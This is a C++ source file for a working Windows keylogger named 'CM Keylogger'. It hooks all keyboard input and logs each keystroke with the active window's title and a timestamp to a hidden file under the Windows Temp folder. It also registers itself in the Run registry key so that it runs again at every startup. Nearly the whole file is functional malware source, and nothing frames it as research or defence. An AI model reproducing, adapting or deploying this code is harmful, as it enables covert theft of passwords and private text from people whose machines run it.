#include <windows.h>
#include <stdio.h>
#include <ctime>
#include <direct.h>
using namespace std;


/*
 ######  ##     ##    ##          ###    ########   ######
##    ## ###   ###    ##         ## ##   ##     ## ##    ##
##       #### ####    ##        ##   ##  ##     ## ##
##       ## ### ##    ##       ##     ## ########   ######
##       ##     ##    ##       ######### ##     ##       ##
##    ## ##     ##    ##       ##     ## ##     ## ##    ##
 ######  ##     ##    ######## ##     ## ########   ######
 
*/


char *ActiveWindow;
char *LastCapture;
char *Path;
bool Shift=false;
FILE *pFile;

typedef DWORD WINAPI (CALLBACK *ReadKey)(int vKey);
ReadKey Key;

typedef HWND WINAPI (CALLBACK *LastWindow)();
LastWindow GetW;

typedef int WINAPI (CALLBACK *GetTEXT)(HWND hwnd, LPTSTR lpString, int nMaxCount);
GetTEXT GetT;


LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);

LRESULT CALLBACK KeyLogg(int nCode, WPARAM wParam, LPARAM lParam) 
{
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);
    int c=0;
    
    
    if (wParam == WM_KEYUP)
    {
		if(p->vkCode==VK_LSHIFT || p->vkCode==VK_RSHIFT)
        {
            Shift=false;
        }
	}
		
    
    if (wParam == WM_KEYDOWN)
    {
		
		pFile=fopen(Path,"a+");
		
		//State of Shift
        if(p->vkCode==VK_LSHIFT || p->vkCode==VK_RSHIFT)
        {
            Shift=true;
        }
        
        if(p->vkCode==VK_F6)
        {
            PostQuitMessage(0);
            fclose(pFile);
            
        }
        
        GetT(GetW(),ActiveWindow,100);
        
        
        
        
        while(ActiveWindow[c]!='\0')
        {
            if(ActiveWindow[c]!=LastCapture[c])
            {
				time_t rawtime;
				time(&rawtime);
				fprintf(pFile, "\n\n[%s] - %s",ActiveWindow,ctime(&rawtime));
                break;
            }
            c++;
        }
        
        if(ActiveWindow[c]!='\0')
        {
            c=0;
            while(ActiveWindow[c]!='\0')
            {
                LastCapture[c]=ActiveWindow[c];
                c++;
            }
        }
        
        switch(p->vkCode)
        {
			case 8:
				fprintf(pFile,"[Back Space]");
			break;
			
			case 9:
				fprintf(pFile,"[Tab]");
			break;
			
			case 13:
				fprintf(pFile,"[Enter]");
			break;
			
			case 19:
				fprintf(pFile,"[Pause]");
			break;
			
			case 20:
				fprintf(pFile,"[Caps Lock]");
			break;
			
			case 27:
				fprintf(pFile,"[Esc]");
			break;
			
			case 32:
				fprintf(pFile,"[Space]");
			break;
			
			case 33:
				fprintf(pFile,"[Page Up]");
			break;
			
			case 34:
				fprintf(pFile,"[Page Down]");
			break;
			
			case 35:
				fprintf(pFile,"[End]");
			break;
			
			case 36:
				fprintf(pFile,"[Home]");
			break;
			
			case 37:
				fprintf(pFile,"[Left]");
			break;
			
			case 38:
				fprintf(pFile,"[Up]");
			break;
			
			case 39:
				fprintf(pFile,"[Rigth]");
			break;
			
			case 40:
				fprintf(pFile,"[Down]");
			break;
			
			case 44:
				fprintf(pFile,"[SysRq]");
			break;
			
			case 45:
				fprintf(pFile,"[Insert]");
			break;
			
			case 46:
				fprintf(pFile,"[Delete]");
			break;
			
			case 48:
				fprintf(pFile,"0");
			break;
			
			case 49:
				fprintf(pFile,"1");
			break;
			
			case 50:
				fprintf(pFile,"2");
			break;
			
			case 51:
				fprintf(pFile,"3");
			break;
			
			case 52:
				fprintf(pFile,"4");
			break;
			
			case 53:
				fprintf(pFile,"5");
			break;
			
			case 54:
				fprintf(pFile,"6");
			break;
			
			case 55:
				fprintf(pFile,"7");
			break;
			
			case 56:
				fprintf(pFile,"8");
			break;
			
			case 57:
				fprintf(pFile,"9");
			break;
			
			case 91:
				fprintf(pFile,"[Left Win]");
			break;
			
			case 92:
				fprintf(pFile,"[Rigth Win]");
			break;
			
			case 93:
				fprintf(pFile,"[App Menu]");
			break;
			
			case 96:
				fprintf(pFile,"[Num 0]");
			break;
			
			case 97:
				fprintf(pFile,"[Num 1]");
			break;
			
			case 98:
				fprintf(pFile,"[Num 2]");
			break;
			
			case 99:
				fprintf(pFile,"[Num 3]");
			break;
			
			case 100:
				fprintf(pFile,"[Num 4]");
			break;
			
			case 101:
				fprintf(pFile,"[Num 5]");
			break;
			
			case 102:
				fprintf(pFile,"[Num 6]");
			break;
			
			case 103:
				fprintf(pFile,"[Num 7]");
			break;
			
			case 104:
				fprintf(pFile,"[Num 8]");
			break;
			
			case 105:
				fprintf(pFile,"[Num 9]");
			break;
			
			case 106:
				fprintf(pFile,"[*]");
			break;
			
			case 107:
				fprintf(pFile,"[+]");
			break;
			
			case 109:
				fprintf(pFile,"[-]");
			break;
			
			case 110:
				fprintf(pFile,"[.]");
			break;
			
			case 111:
				fprintf(pFile,"[/]");
			break;
			
			case 112:
				fprintf(pFile,"[F1]");
			break;
			
			case 113:
				fprintf(pFile,"[F2]");
			break;
			
			case 114:
				fprintf(pFile,"[F3]");
			break;
			
			case 115:
				fprintf(pFile,"[F4]");
			break;
			
			case 116:
				fprintf(pFile,"[F5]");
			break;
			
			case 117:
				fprintf(pFile,"[F6]");
			break;
			
			case 118:
				fprintf(pFile,"[F7]");
			break;
			
			case 119:
				fprintf(pFile,"[F8]");
			break;
			
			case 120:
				fprintf(pFile,"[F9]");
			break;
			
			case 121:
				fprintf(pFile,"[F10]");
			break;
			
			case 122:
				fprintf(pFile,"[F11]");
			break;
			
			case 123:
				fprintf(pFile,"[F12]");
			break;
			
			case 144:
				fprintf(pFile,"[Bloq Num]");
			break;
			
			case 145:
				fprintf(pFile,"[Scroll]");
			break;
			
			case 160:
				fprintf(pFile,"[Left Shift]");
			break;
			
			case 161:
				fprintf(pFile,"[Rigth Shift]");
			break;
			
			case 162:
				fprintf(pFile,"[Left Ctrl]");
			break;
			
			case 163:
				fprintf(pFile,"[Rigth Ctrl]");
			break;
			case 186:
				fprintf(pFile,"[");
			break;
			
			case 187:
				fprintf(pFile,"]");
			break;
			
			case 188:
				fprintf(pFile,"[,]");
			break;
			
			case 189:
				fprintf(pFile,"[-]");
			break;
			
			case 190:
				fprintf(pFile,"[.]");
			break;
			
			case 191:
				fprintf(pFile,"[ç]");
			break;
			
			case 219:
				fprintf(pFile,"[\']");
			break;
			
			case 220:
				fprintf(pFile,"[º]");
			break;
			
			case 221:
				fprintf(pFile,"[¡]");
			break;
			
			case 222:
				fprintf(pFile,"[´]");
			break;
			
			case 226:
				fprintf(pFile,"[<]");
			break;
            
            default:
				if( (p->vkCode>=65 && p->vkCode<=90)  )
				{
					if( (((Key(VK_CAPITAL) & 0x0001)!=0) && Shift==false ) || ( ((Key(VK_CAPITAL) & 0x0001)==0) && Shift==true )  )
					{
						fprintf(pFile, "%c",p->vkCode);
					}
					else
					{
						fprintf(pFile, "%c",p->vkCode+32);
					}
				}
        }
        fclose(pFile);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void Add_Regedit(char *value)
{
	HKEY Key;
	
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &Key)== ERROR_SUCCESS)
	{
		RegSetValueEx(Key,"CM Keylogger", 0, REG_SZ, (const BYTE*)value,strlen(value));
		RegCloseKey(Key);
	}
	else
	{
	    if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &Key)== ERROR_SUCCESS)
	    {
	    	RegSetValueEx(Key,"CM Keylogger", 0, REG_SZ, (const BYTE*)value,strlen(value));
	    	RegCloseKey(Key);
		}
	}
}

char *GetKeyboardLanguage()
{
	HKEY Key;
	char *Name=(char*)malloc(200);
	char *ID=(char*)malloc(100);
	char *LayoutPath=(char*)malloc(200);
	memset(LayoutPath,0,200);
	memset(ID,0,100);
	GetKeyboardLayoutName(ID);
	strcat(LayoutPath,"SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\");
	strcat(LayoutPath,ID);
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, LayoutPath, 0, KEY_QUERY_VALUE, &Key)== ERROR_SUCCESS)
	{
		DWORD dwSize=sizeof(Name), Type=REG_SZ;
		RegQueryValueEx(Key,"Layout Text",0,&Type,(LPBYTE)Name,&dwSize);
	    RegCloseKey(Key);
	}
	return (char*)Name;
}


int main(int argc, char**args)
{
    MSG messages;
    
    HINSTANCE hThisInstance = GetModuleHandle(NULL);
    
    ActiveWindow=(char*)malloc(MAX_PATH);
    memset(ActiveWindow,0,100);
    
    LastCapture=(char*)malloc(MAX_PATH);
    memset(LastCapture,0,100);
    
	HMODULE hIns=(HMODULE)LoadLibrary("user32.dll");
    if(hIns)
    {
        if(!(Key=(ReadKey)GetProcAddress(hIns,"GetKeyState"))){return 1;} 
        if(!(GetW=(LastWindow)GetProcAddress(hIns,"GetForegroundWindow"))){return 1;} 
        if(!(GetT=(GetTEXT)GetProcAddress(hIns,"GetWindowTextA"))){return 1;} 
    }
    
    Add_Regedit(args[0]);
    Path=(char*)malloc(300);
    memset(Path,0,300);
    GetWindowsDirectory(Path,300);
    strcat(Path,"\\Temp\\CM Logs");
    CreateDirectory(Path,NULL);
    SetFileAttributes(Path,FILE_ATTRIBUTE_HIDDEN);
    strcat(Path,"\\CM Logs.txt");
    pFile=fopen(Path, "a+");
    fprintf(pFile,"Keyboard Layout:\t %s",GetKeyboardLanguage());
    fclose(pFile);
    SetFileAttributes(Path,FILE_ATTRIBUTE_HIDDEN);
    
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,KeyLogg,hThisInstance,0);     
    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }
    return messages.wParam;
}


LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)                 
    {
        default:                      
            return DefWindowProc (hwnd, message, wParam, lParam);
    }

    return 0;
}




